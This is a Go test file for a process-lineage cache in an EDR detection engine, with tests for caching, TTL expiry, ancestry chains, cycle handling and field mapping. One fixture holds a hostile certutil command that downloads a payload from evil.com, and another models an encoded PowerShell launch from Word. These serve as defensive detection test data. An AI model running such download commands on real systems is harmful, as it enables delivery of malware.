package cache_test

import (
	"context"
	"testing"
	"time"

	"github.com/edr-platform/sigma-engine/internal/infrastructure/cache"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestInMemoryLineageCache_WriteAndGet tests basic write + retrieval.
func TestInMemoryLineageCache_WriteAndGet(t *testing.T) {
	c := cache.NewInMemoryLineageCache(5 * time.Minute)
	ctx := context.Background()

	entry := &cache.ProcessLineageEntry{
		AgentID:         "agent-001",
		PID:             1234,
		PPID:            5678,
		Name:            "powershell.exe",
		Executable:      `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:     "powershell.exe -enc JABjAG0AZAA=",
		ParentName:      "winword.exe",
		UserSID:         "S-1-5-18",
		IntegrityLevel:  "High",
		IsElevated:      true,
		SignatureStatus: "microsoft",
		SeenAt:          time.Now().Unix(),
	}

	err := c.WriteEntry(ctx, entry)
	require.NoError(t, err)

	got, err := c.GetEntry(ctx, "agent-001", 1234)
	require.NoError(t, err)
	require.NotNil(t, got)

	assert.Equal(t, "agent-001", got.AgentID)
	assert.Equal(t, int64(1234), got.PID)
	assert.Equal(t, int64(5678), got.PPID)
	assert.Equal(t, "powershell.exe", got.Name)
	assert.Equal(t, "winword.exe", got.ParentName)
	assert.Equal(t, "S-1-5-18", got.UserSID)
	assert.True(t, got.IsElevated)
	assert.Equal(t, "microsoft", got.SignatureStatus)
}

// TestInMemoryLineageCache_MissOnUnknownKey verifies a miss returns (nil, nil).
func TestInMemoryLineageCache_MissOnUnknownKey(t *testing.T) {
	c := cache.NewInMemoryLineageCache(5 * time.Minute)
	ctx := context.Background()

	got, err := c.GetEntry(ctx, "agent-001", 9999)
	require.NoError(t, err)
	assert.Nil(t, got, "Expected nil on cache miss")
}

// TestInMemoryLineageCache_TTLExpiry verifies entries expire after TTL.
func TestInMemoryLineageCache_TTLExpiry(t *testing.T) {
	c := cache.NewInMemoryLineageCache(50 * time.Millisecond)
	ctx := context.Background()

	entry := &cache.ProcessLineageEntry{
		AgentID: "agent-ttl",
		PID:     42,
		PPID:    1,
		Name:    "cmd.exe",
		SeenAt:  time.Now().Unix(),
	}
	require.NoError(t, c.WriteEntry(ctx, entry))

	// Entry should exist immediately.
	got, err := c.GetEntry(ctx, "agent-ttl", 42)
	require.NoError(t, err)
	require.NotNil(t, got)

	// After TTL elapses, the entry should be a miss.
	time.Sleep(100 * time.Millisecond)
	got, err = c.GetEntry(ctx, "agent-ttl", 42)
	require.NoError(t, err)
	assert.Nil(t, got, "Expected nil after TTL expiry")
}

// TestInMemoryLineageCache_GetLineageChain verifies recursive ancestry reconstruction.
func TestInMemoryLineageCache_GetLineageChain(t *testing.T) {
	c := cache.NewInMemoryLineageCache(5 * time.Minute)
	ctx := context.Background()
	agentID := "agent-chain"

	// Build a 3-hop chain: powershell (4) → cmd (3) → winword (2)
	// winword has no cached parent (PPID=1 is not in cache).
	entries := []*cache.ProcessLineageEntry{
		{AgentID: agentID, PID: 2, PPID: 1, Name: "winword.exe", SeenAt: time.Now().Unix()},
		{AgentID: agentID, PID: 3, PPID: 2, Name: "cmd.exe", SeenAt: time.Now().Unix()},
		{AgentID: agentID, PID: 4, PPID: 3, Name: "powershell.exe", SeenAt: time.Now().Unix()},
	}
	for _, e := range entries {
		require.NoError(t, c.WriteEntry(ctx, e))
	}

	chain, err := c.GetLineageChain(ctx, agentID, 4)
	require.NoError(t, err)
	require.Len(t, chain, 3, "Expected 3-hop chain")

	assert.Equal(t, "powershell.exe", chain[0].Name, "chain[0] should be target")
	assert.Equal(t, "cmd.exe", chain[1].Name, "chain[1] should be parent")
	assert.Equal(t, "winword.exe", chain[2].Name, "chain[2] should be grandparent")
}

// TestInMemoryLineageCache_ChainDepthLimit verifies the depth cap is respected.
func TestInMemoryLineageCache_ChainDepthLimit(t *testing.T) {
	c := cache.NewInMemoryLineageCache(5 * time.Minute)
	ctx := context.Background()
	agentID := "agent-depth"

	// Build a 6-hop chain — deeper than maxLineageDepth (4).
	for i := 1; i <= 6; i++ {
		require.NoError(t, c.WriteEntry(ctx, &cache.ProcessLineageEntry{
			AgentID: agentID,
			PID:     int64(i),
			PPID:    int64(i - 1),
			Name:    "proc.exe",
			SeenAt:  time.Now().Unix(),
		}))
	}

	chain, err := c.GetLineageChain(ctx, agentID, 6)
	require.NoError(t, err)
	// maxLineageDepth = 4, so chain must be at most 4 entries.
	assert.LessOrEqual(t, len(chain), 4, "Chain must respect maxLineageDepth")
}

// TestInMemoryLineageCache_CycleDetection verifies cycle prevention.
func TestInMemoryLineageCache_CycleDetection(t *testing.T) {
	c := cache.NewInMemoryLineageCache(5 * time.Minute)
	ctx := context.Background()
	agentID := "agent-cycle"

	// Artificial cycle: A(pid=10) → B(pid=20) → A(pid=10)
	require.NoError(t, c.WriteEntry(ctx, &cache.ProcessLineageEntry{
		AgentID: agentID, PID: 10, PPID: 20, Name: "A.exe", SeenAt: time.Now().Unix(),
	}))
	require.NoError(t, c.WriteEntry(ctx, &cache.ProcessLineageEntry{
		AgentID: agentID, PID: 20, PPID: 10, Name: "B.exe", SeenAt: time.Now().Unix(),
	}))

	// Should terminate without infinite loop.
	chain, err := c.GetLineageChain(ctx, agentID, 10)
	require.NoError(t, err)
	assert.NotEmpty(t, chain)
}

// TestNewProcessLineageEntry_FieldMapping verifies the constructor correctly
// maps raw event data fields to struct fields.
func TestNewProcessLineageEntry_FieldMapping(t *testing.T) {
	data := map[string]interface{}{
		"pid":               int64(1000),
		"ppid":              int64(500),
		"name":              "certutil.exe",
		"executable":        `C:\Windows\System32\certutil.exe`,
		"command_line":      "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
		"parent_name":       "powershell.exe",
		"parent_executable": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"user_name":         "SYSTEM",
		"user_sid":          "S-1-5-18",
		"integrity_level":   "System",
		"is_elevated":       true,
		"signature_status":  "microsoft",
		"hash_sha256":       "abc123def456",
	}

	entry := cache.NewProcessLineageEntry("agent-007", data)

	assert.Equal(t, "agent-007", entry.AgentID)
	assert.Equal(t, int64(1000), entry.PID)
	assert.Equal(t, int64(500), entry.PPID)
	assert.Equal(t, "certutil.exe", entry.Name)
	assert.Equal(t, "powershell.exe", entry.ParentName)
	assert.Equal(t, "S-1-5-18", entry.UserSID)
	assert.Equal(t, "System", entry.IntegrityLevel)
	assert.True(t, entry.IsElevated)
	assert.Equal(t, "microsoft", entry.SignatureStatus)
	assert.Equal(t, "abc123def456", entry.HashSHA256)
	assert.NotZero(t, entry.SeenAt)
}

// TestNewProcessLineageEntry_CommandLineTruncation verifies 512-char cap.
func TestNewProcessLineageEntry_CommandLineTruncation(t *testing.T) {
	longCmd := make([]byte, 1000)
	for i := range longCmd {
		longCmd[i] = 'A'
	}
	data := map[string]interface{}{
		"pid":          int64(1),
		"ppid":         int64(0),
		"name":         "x.exe",
		"command_line": string(longCmd),
	}
	entry := cache.NewProcessLineageEntry("agent-trunc", data)
	assert.Len(t, entry.CommandLine, 512, "CommandLine should be capped at 512 chars")
}

// TestNoopLineageCache_AlwaysMisses verifies the noop implementation never errors.
func TestNoopLineageCache_AlwaysMisses(t *testing.T) {
	c := cache.NewNoopLineageCache()
	ctx := context.Background()

	err := c.WriteEntry(ctx, &cache.ProcessLineageEntry{AgentID: "a", PID: 1, PPID: 0, Name: "x.exe"})
	require.NoError(t, err)

	entry, err := c.GetEntry(ctx, "a", 1)
	require.NoError(t, err)
	assert.Nil(t, entry)

	chain, err := c.GetLineageChain(ctx, "a", 1)
	require.NoError(t, err)
	assert.Empty(t, chain)

	assert.EqualValues(t, 2, c.MissCount())
}
